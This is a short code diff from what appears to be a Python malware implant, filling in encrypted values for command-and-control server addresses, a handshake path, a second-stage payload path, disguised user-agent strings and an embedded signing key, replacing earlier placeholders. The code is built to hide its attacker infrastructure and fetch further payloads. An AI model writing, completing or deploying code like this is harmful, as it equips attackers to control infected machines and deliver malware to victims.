@@ -37,20 +37,20 @@ def d(s: str) -> str:
     """Decode base64, then decrypt."""
     return _decrypt_string(base64.b64decode(s))
 
-# All sensitive strings are stored encrypted (replace with your own)
+# All sensitive strings are stored encrypted
 C2_URLS = [
-    d('BASE64_ENCRYPTED_STRING_1'),
-    d('BASE64_ENCRYPTED_STRING_2')
+    d('6XJijDHpkuALVnaRD0PvvW1LLXMR6H4+Psw1dWzWI2RLjF3AWQ=='),
+    d('HH97W77K3eMPqHoBU8aGANQfT9KNKssLruHyNdgUlHVoAGL7+w==')
 ]
-HANDSHAKE_PATH = d('BASE64_ENCRYPTED_HANDSHAKE')
-STAGE2_PATH = d('BASE64_ENCRYPTED_STAGE2')
+HANDSHAKE_PATH = d('D8oR+8QQLbu3x7yrF8ecjUqPZuilO+vCcq0=')
+STAGE2_PATH = d('X8EgaXTYm29+YcSqNfubfmzvY0JPM8AwfuChLwmRY7/KlQ==')
 USER_AGENTS = [
-    d('BASE64_ENCRYPTED_UA_1'),
-    d('BASE64_ENCRYPTED_UA_2')
+    d('jxiVBYsa0+laSGu0c+7CA1eJNdUUjifkVKjwcCmMl0QphHcw3BIxQ0iZxka9ydTddNB7h1iacP9IpoEgcbebfSiJSyqIc1BQTofbQA=='),
+    d('WrV+T0Xdk/U6Z1pC9Z/VjzB6/1xr0YT5xjDP3swrXzVl0Wd/lMkuB9hnfwofcYexHjXKZiflxefDQc7Lu1EXdk3PY3yC9nBF2mB/QEZi/f5OIw==')
 ]
 
 # Ed25519 public key (embedded, encrypted)
-PUBLIC_KEY_B64 = d('BASE64_ENCRYPTED_PUBKEY')
+PUBLIC_KEY_B64 = d('8U7K6xfE5YFRGS06AMT8HgOj2p9nmEXpTmEOf3T7ZEdUgXOh7Ba0bvdejcaLEd/mA6Pan2eYRelOYQ4D')  # Placeholder
 
 try:
     from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
